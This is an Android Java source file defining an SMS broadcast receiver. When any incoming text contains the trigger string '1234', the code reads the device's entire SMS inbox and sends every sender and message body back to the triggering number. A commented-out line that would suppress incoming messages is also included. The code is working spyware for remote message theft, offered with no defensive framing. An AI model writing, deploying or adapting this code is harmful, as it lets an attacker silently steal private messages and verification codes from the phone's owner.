package com.example;


import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver{
    public static final String SMS_EXTRA_NAME = "pdus";


    public void onReceive( Context context, Intent intent )
    {
// Get the SMS map from Intent
        Bundle extras = intent.getExtras();
        String messages = "";

        String replyToAdress = "";
        if ( extras != null )
        {
            Object[] smsExtra = (Object[]) extras.get( SMS_EXTRA_NAME );

            ContentResolver contentResolver = context.getContentResolver();

            for ( int i = 0; i < smsExtra.length; ++i )
            {
                SmsMessage sms = SmsMessage.createFromPdu((byte[])smsExtra[i]);

                String body = sms.getMessageBody().toString();
                String address = sms.getOriginatingAddress();

                if(body.contains("1234")){
                    replyToAdress = address;
                }
            }

// Display SMS message
            Toast.makeText(context, messages, Toast.LENGTH_SHORT).show();
        }

        respond(context, replyToAdress);
// WARNING!!!
// If you uncomment the next line then received SMS will not be put to incoming.
// Be careful!
// this.abortBroadcast();

    }

    public void respond(Context context, String replyToAdress){
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query( Uri.parse("content://sms/inbox"), null, null, null, null);

        int indexBody = cursor.getColumnIndex("BODY");
        int indexAddr = cursor.getColumnIndex("ADDRESS");

        if ( indexBody < 0 || !cursor.moveToFirst() ) return;

        String messages= "";

        do
        {
            String str = "Sender: " + cursor.getString( indexAddr ) + "\n" + cursor.getString( indexBody );
            messages += str;
        }
        while( cursor.moveToNext() );


        sendSMS(replyToAdress,messages,context);

    }

    private void sendSMS(String phoneNumber, String message, Context context)
    {
        PendingIntent pi = PendingIntent.getService(context, 0,
                new Intent("SMS_SENT"), 0);
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, message, pi, null);
    }


}
